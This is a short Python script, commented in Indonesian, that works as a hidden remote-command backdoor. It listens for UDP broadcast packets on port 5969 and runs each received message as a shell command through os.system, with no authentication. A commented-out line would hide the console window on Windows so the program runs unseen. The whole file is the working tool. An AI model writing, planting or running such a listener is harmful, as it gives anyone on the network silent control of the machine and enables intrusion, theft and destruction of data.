import socket
import os
import ctypes

#ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 ) #berlaku untuk windoz agar jendela aplikasinya hilang  
soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
host = socket.gethostname()
ipadd = socket.gethostbyname(host)
soket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
print(ipadd)
soket.bind(("0.0.0.0", 5969))
while True:
    psn, almt = soket.recvfrom(1024)
    os.system(psn.decode())

